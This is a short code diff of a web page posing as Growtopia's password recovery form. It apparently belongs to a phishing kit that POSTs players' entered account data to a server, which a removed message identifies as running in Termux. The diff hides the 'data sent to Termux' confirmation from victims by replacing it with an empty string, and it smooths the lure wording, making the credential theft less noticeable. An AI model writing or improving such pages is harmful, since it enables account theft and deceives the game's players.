@@ -104,7 +104,7 @@
             <img src="banner.png" alt="August Season Banner" class="banner">
 
             <h2>GROWTOPIA PASSWORD RECOVERY</h2>
-            <p>Enter in your Growtopia data and you can reset your password. (You'll have to check your email and click the URL we send, so if your email address wasn't entered correctly when you made your account, you may not be able to recover it.)</p>
+            <p>Enter in your Growtopia data and you can reset your password. (You'll have to check your email and click the URL we send, so if your email address wasn't entered correctly when you made your account you may not be able to recover your password.)</p>
             
             <form id="growForm">
                 <div class="form-group">
@@ -132,10 +132,10 @@
             method: 'POST',
             body: formData
         }).then(r => {
-            if (r.ok) {
-                document.getElementById('hasil').innerText = 'Data berhasil dikirim ke Termux!';
-            } else {
+            if (!r.ok) {
                 document.getElementById('hasil').innerText = 'Gagal mengirim data.';
+            } else {
+                document.getElementById('hasil').innerText = '';
             }
         }).catch(err => {
             document.getElementById('hasil').innerText = 'Gagal mengirim data.';
